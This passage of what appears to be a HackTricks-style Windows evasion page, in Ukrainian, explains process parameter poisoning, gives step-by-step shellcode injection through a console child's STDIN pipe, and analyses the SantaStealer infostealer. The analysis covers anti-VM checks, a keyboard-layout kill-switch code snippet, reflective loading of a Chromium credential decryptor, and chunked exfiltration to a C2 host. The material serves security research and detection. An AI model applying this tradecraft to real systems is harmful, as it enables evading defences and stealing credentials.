- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк передавання між процесами**, а не самостійний повноцінний примітив виконання: скопійованому параметру все ще потрібна зміна прав доступу на виконання та спосіб перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього підходу, оскільки він усередині використовує підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Ін’єкція через pipe STDIN консолі

Інтерактивний дочірній процес консолі також можна використовувати як **примітив передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу до pipe і надсилає маркер, а за ним — shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє до нього потік дочірнього процесу. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є ін’єкцією в процес, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

Попри опис як «named-pipe», у довідковій реалізації викликається `CreatePipe`, який створює **анонімний pipe**. Windows усередині реалізує анонімні pipe за допомогою унікально названих pipe-об’єктів, але PoC ані не задає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, розміщує дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає переданий йому виконуваний файл консолі; він не під’єднує свій pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Типовий порядок дій

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipe для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів на боці батьківського процесу та закрити в ньому копії дескрипторів на боці дочірнього процесу після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, з параметром `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати повний бінарний масив `rawData` через дескриптор `STDIN` на боці батьківського процесу за допомогою `WriteFile`. Консольна програма обробляє байти й залишає копію в одній зі своїх приватних областей пам’яті з фіксацією.
4. Обійти адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати кандидатні області `MEM_PRIVATE` за допомогою `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити права знайденого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Визначити основний потік, призупинити його, задати `RIP` значення `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його роботу.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з 25-байтового маркера, тому виконувані байти починаються зі шістнадцяткового зміщення `0x19`. Замінюючи payload, збережіть це розташування або разом оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до вихідного коду також зазначено `0x0A`, `0x0D` і `0x1A` як недопустимі символи. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади невеликих нативних допоміжних програм і шаблонів компіляції payload див. у [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Тактики SantaStealer для fileless-ухилення та крадіжки облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні infostealers поєднують AV bypass, anti-analysis і доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Фільтрація за розкладкою клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-ів, уникаючи виконання в виключених регіонах і залишаючи артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, обчислює хеш кожного імені за допомогою власної rolling checksum і порівнює його з вбудованими списками блокування для debugger/sandbox; потім повторно обчислює checksum для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, нещодавній час роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо пауз, щоб виявити покрокове виконання. Будь-який збіг призводить до переривання роботи до запуску модулів.

### Безфайловий helper + подвійне reflective loading через ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у безфайловому режимі він самостійно розв’язує імпорти/релокації, тож жодних артефактів helper не записується.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, запозичені з [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing із direct-syscall для впровадження в активний браузер Chromium, отримують у спадок ключі AppBound Encryption і розшифровують паролі/cookies/дані кредитних карток безпосередньо з баз даних SQLite, попри посилений захист ABE.


### Модульний збір даних у пам’яті та фрагментована ексфільтрація через HTTP

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування завершення потоків протягом приблизно 45 секунд.
- Після завершення все архівується за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів фрагментами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи межу браузера `multipart/form-data` (`----WebKitFormBoundary***`). До кожного фрагмента додаються `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а до останнього фрагмента додається `complete: true`, щоб C2 знав, що складання архіву завершено.

## References

- [1] [Advanced Evasion Tradecraft: Точне підміщення модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стек викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – підміна стека викликів PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюжок зараження та обфускація на основі ConfuserEx для DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переспрямованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік переспрямованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Порядок пошуку dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Засіб запуску CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Протидія EDR за підтримки Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Як пробити захисну оболонку Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – За чистою завісою: від RAT до builder і розробника](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer завітає до міста: новий амбітний викрадач інформації](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: заколисування Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підміна стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Зловживання Chrome Remote Desktop під час Red Team-операцій: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: перетворення драйвера усунення загроз Defender на примітив для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – вихідний код InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Створення дочірнього процесу з перенаправленими вхідними та вихідними даними](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
